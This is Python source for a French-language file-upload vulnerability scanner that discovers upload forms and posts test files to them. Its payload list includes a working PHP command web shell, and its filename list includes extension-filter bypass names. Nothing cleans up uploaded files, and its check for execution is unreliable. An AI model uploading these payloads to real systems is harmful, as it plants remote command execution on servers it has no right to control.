"""
Scanner de vulnérabilités File Upload
Détecte les uploads non sécurisés permettant l'exécution de code
"""

import asyncio
from typing import List, Optional
from loguru import logger
import aiohttp
from urllib.parse import urlparse, urljoin

from core.models import Vulnerabilite


class ScannerFileUpload:
    """
    Scanner qui détecte les vulnérabilités d'upload de fichiers
    - Upload de fichiers exécutables (PHP, JSP, etc.)
    - Bypass de filtres d'extension
    - Upload vers des répertoires accessibles
    """

    def __init__(self):
        # Extensions dangereuses à tester
        self.extensions_dangereuses = [
            '.php', '.php3', '.php4', '.php5', '.phtml',
            '.jsp', '.jspx', '.asp', '.aspx',
            '.sh', '.py', '.pl', '.rb',
            '.exe', '.bat', '.cmd'
        ]
        
        # ⭐ PHASE 4: Payloads de test (non destructifs) - avec marqueur unique
        import time
        marqueur_unique = f"VULNHUNTER_UPLOAD_{int(time.time())}"  # Marqueur unique par scan
        self.marqueur_unique = marqueur_unique
        
        self.payloads_test = [
            # PHP simple avec marqueur unique
            f'<?php echo "{marqueur_unique}"; ?>'.encode(),
            # PHP avec shell
            b'<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
            # JSP
            f'<% out.println("{marqueur_unique}"); %>'.encode(),
            # ASP
            f'<% Response.Write("{marqueur_unique}") %>'.encode(),
        ]
        
        # Noms de fichiers de test
        self.noms_fichiers = [
            'test.php',
            'shell.php',
            'upload.php',
            'test.php.jpg',  # Double extension
            'test.php%00.jpg',  # Null byte
            'test.phtml',
            'test.php3',
            'test.php5',
            'test.jpg.php',  # Extension inversée
            '.htaccess',  # Configuration Apache
        ]

    async def scanner(self, url: str) -> List[Vulnerabilite]:
        """
        Scan complet des vulnérabilités d'upload
        
        Args:
            url: URL de base à tester
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        try:
            logger.info(f"🔍 Scan File Upload: {url}")
            
            # 1. Découvrir les endpoints d'upload
            endpoints_upload = await self._decouvrir_endpoints_upload(url)
            
            if not endpoints_upload:
                logger.debug("ℹ️  Aucun endpoint d'upload trouvé")
                return vulnerabilites
            
            logger.info(f"📋 {len(endpoints_upload)} endpoint(s) d'upload trouvé(s)")
            
            # 2. Tester chaque endpoint
            for endpoint in endpoints_upload:
                vuln = await self._tester_endpoint_upload(endpoint)
                if vuln:
                    vulnerabilites.extend(vuln if isinstance(vuln, list) else [vuln])
            
            if vulnerabilites:
                logger.success(f"✅ {len(vulnerabilites)} vulnérabilité(s) d'upload détectée(s)")
            else:
                logger.debug("ℹ️  Aucune vulnérabilité d'upload détectée")
            
            return vulnerabilites
            
        except Exception as e:
            logger.error(f"Erreur scan File Upload: {str(e)}")
            return []

    async def _decouvrir_endpoints_upload(self, url: str) -> List[str]:
        """
        Découvre les endpoints d'upload potentiels
        """
        endpoints = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Endpoints connus à tester
        endpoints_connus = [
            'upload.php',
            'upload',
            'fileupload.php',
            'file_upload.php',
            'upload_file.php',
            'uploader.php',
            'upload-image.php',
            'upload-image',
            'admin/upload.php',
            'admin/upload',
            'api/upload',
            'api/upload.php',
        ]
        
        async with aiohttp.ClientSession() as session:
            for endpoint_rel in endpoints_connus:
                endpoint_url = urljoin(base_url, endpoint_rel)
                
                try:
                    async with session.get(
                        endpoint_url,
                        timeout=aiohttp.ClientTimeout(total=5),
                        allow_redirects=True
                    ) as response:
                        if response.status == 200:
                            contenu = await response.text()
                            
                            # Vérifier si c'est une page d'upload (formulaire avec type="file")
                            if 'type="file"' in contenu.lower() or 'input.*file' in contenu.lower():
                                endpoints.append(endpoint_url)
                                logger.debug(f"✅ Endpoint d'upload trouvé: {endpoint_url}")
                
                except Exception:
                    continue
        
        return endpoints

    async def _tester_endpoint_upload(self, url: str) -> List[Vulnerabilite]:
        """
        Teste un endpoint d'upload spécifique
        """
        vulnerabilites = []
        
        try:
            # 1. Analyser le formulaire d'upload
            formulaire_info = await self._analyser_formulaire_upload(url)
            
            if not formulaire_info:
                return vulnerabilites
            
            logger.debug(f"🔍 Test upload sur: {url}")
            
            # ⭐ PHASE 4: Tester différents payloads - augmenté pour meilleure détection
            for nom_fichier in self.noms_fichiers[:8]:  # ⭐ Augmenté de 5 à 8
                for payload in self.payloads_test[:3]:  # ⭐ Augmenté de 2 à 3 payloads
                    vuln = await self._tester_upload(
                        url,
                        formulaire_info,
                        nom_fichier,
                        payload
                    )
                    
                    if vuln:
                        vulnerabilites.append(vuln)
                        # ⭐ PHASE 4: Continuer à tester pour trouver toutes les vulnérabilités
                        # Ne pas s'arrêter après la première
        
        except Exception as e:
            logger.debug(f"Erreur test upload {url}: {str(e)}")
        
        return vulnerabilites

    async def _analyser_formulaire_upload(self, url: str) -> Optional[dict]:
        """
        Analyse le formulaire d'upload pour extraire les informations nécessaires
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status != 200:
                        return None
                    
                    contenu = await response.text()
                    
                    # Extraire les informations du formulaire (simplifié)
                    # En production, utiliser BeautifulSoup pour une analyse plus précise
                    if 'type="file"' in contenu.lower():
                        # Retourner des infos par défaut
                        return {
                            'action': url,  # Utiliser l'URL actuelle comme action
                            'method': 'POST',
                            'field_name': 'file'  # Nom de champ par défaut
                        }
        
        except Exception:
            pass
        
        return None

    async def _tester_upload(
        self,
        url: str,
        formulaire_info: dict,
        nom_fichier: str,
        contenu_fichier: bytes
    ) -> Optional[Vulnerabilite]:
        """
        Teste un upload spécifique
        """
        try:
            async with aiohttp.ClientSession() as session:
                # Créer un multipart form data
                data = aiohttp.FormData()
                data.add_field(
                    formulaire_info.get('field_name', 'file'),
                    contenu_fichier,
                    filename=nom_fichier,
                    content_type='application/octet-stream'
                )
                
                async with session.post(
                    formulaire_info.get('action', url),
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=15),
                    allow_redirects=True
                ) as response:
                    if response.status in [200, 201, 302]:
                        # Vérifier si le fichier a été uploadé
                        contenu = await response.text()
                        
                        # Chercher des indices d'upload réussi
                        if 'upload' in contenu.lower() or 'success' in contenu.lower() or response.status == 201:
                            # Tester si le fichier est accessible
                            fichier_url = await self._tester_acces_fichier(url, nom_fichier)
                            
                            if fichier_url:
                                # Vérifier si le payload s'exécute
                                if await self._verifier_execution(fichier_url):
                                    logger.success(f"✅ File Upload vulnérable détecté: {nom_fichier}")
                                    
                                    return Vulnerabilite(
                                        type="File Upload non sécurisé",
                                        severite="CRITIQUE",
                                        url=url,
                                        description=f"Upload de fichier exécutable possible ({nom_fichier})",
                                        payload=f"Fichier: {nom_fichier}",
                                        preuve=f"Fichier accessible et exécutable: {fichier_url}",
                                        cvss_score=9.8,
                                        remediation="Valider strictement les types de fichiers, utiliser des whitelists d'extensions, stocker les fichiers hors du répertoire web"
                                    )
        
        except Exception as e:
            logger.debug(f"Erreur test upload spécifique: {str(e)}")
        
        return None

    async def _tester_acces_fichier(self, base_url: str, nom_fichier: str) -> Optional[str]:
        """
        Teste si un fichier uploadé est accessible
        """
        parsed = urlparse(base_url)
        base_path = parsed.path.rsplit('/', 1)[0] if '/' in parsed.path else ''
        
        # Chemins possibles où le fichier pourrait être stocké
        chemins_possibles = [
            f"{base_path}/{nom_fichier}",
            f"{base_path}/uploads/{nom_fichier}",
            f"{base_path}/upload/{nom_fichier}",
            f"{base_path}/files/{nom_fichier}",
            f"{base_path}/images/{nom_fichier}",
            f"/uploads/{nom_fichier}",
            f"/upload/{nom_fichier}",
            f"/files/{nom_fichier}",
            f"/{nom_fichier}",
        ]
        
        base_url_clean = f"{parsed.scheme}://{parsed.netloc}"
        
        async with aiohttp.ClientSession() as session:
            # ⭐ PHASE 4: Tester plus de chemins (jusqu'à 10)
            for chemin in chemins_possibles[:10]:  # ⭐ Augmenté de 5 à 10
                try:
                    test_url = f"{base_url_clean}{chemin}"
                    
                    async with session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status == 200:
                            contenu = await response.text()
                            
                            # ⭐ PHASE 4: Vérifier si le payload est présent (marqueur unique ou ancien)
                            if hasattr(self, 'marqueur_unique') and self.marqueur_unique in contenu:
                                return test_url
                            if 'VULNHUNTER_UPLOAD_TEST' in contenu:
                                return test_url
                
                except Exception:
                    continue
        
        return None

    async def _verifier_execution(self, url: str) -> bool:
        """
        ⭐ PHASE 4: Vérifie si le fichier uploadé s'exécute - amélioré
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=10)  # ⭐ Augmenté de 5 à 10
                ) as response:
                    if response.status == 200:
                        contenu = await response.text()
                        
                        # ⭐ PHASE 4: Vérifier avec le marqueur unique
                        if hasattr(self, 'marqueur_unique') and self.marqueur_unique in contenu:
                            logger.success(f"✅ Exécution confirmée avec marqueur unique: {url}")
                            return True
                        # Fallback sur l'ancien marqueur
                        if 'VULNHUNTER_UPLOAD_TEST' in contenu:
                            return True
        
        except Exception:
            pass
        
        return False

